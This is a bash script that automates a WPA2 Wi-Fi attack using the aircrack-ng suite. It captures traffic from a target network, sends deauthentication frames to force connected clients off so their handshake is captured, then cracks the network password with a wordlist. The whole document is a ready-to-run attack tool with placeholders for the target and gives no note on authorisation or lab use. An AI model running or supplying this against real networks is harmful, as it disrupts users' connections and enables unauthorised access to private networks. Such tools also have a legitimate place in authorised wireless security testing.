#!/bin/bash

# This script automates the deauthentication and dictionary attack against WPA2-protected networks
# Define network interface, target's MAC address, channel, capture file name, and wordlist path
network_interface="<ALFA CARD INTERFACE>"  
bssid="<TARGET'S MAC ADRESS>"  
channel="<CHANNEL OF THE NETWORK>" 
capture_file="capture"  
wordlist_path="<DICTIONARY PATH>" 

# Start capturing packets
echo "[*] Starting packet capture..."
sudo airodump-ng --bssid "$bssid" -c "$channel" -w "$capture_file" "$network_interface" &

# Sleep for 10 seconds to give airodump-ng some time to capture packets
sleep 10

# Start deauthentication attack to disconnect clients from the network
echo "[*] Starting deauthentication attack..."
sudo aireplay-ng --deauth 50 -a "$bssid" "$network_interface"

# Sleep for 10 seconds to allow the deauth attack to take effect
sleep 10

# Stop the packet capture
echo "[*] Stopping packet capture..."
sudo pkill airodump-ng

# Start the process of cracking the WPA/WPA2 password using the captured handshake and a wordlist
echo "[*] Starting password cracking attack..."
sudo aircrack-ng "${capture_file}-01.cap" -w "$wordlist_path"

# Final message
echo "[*] Process completed!"


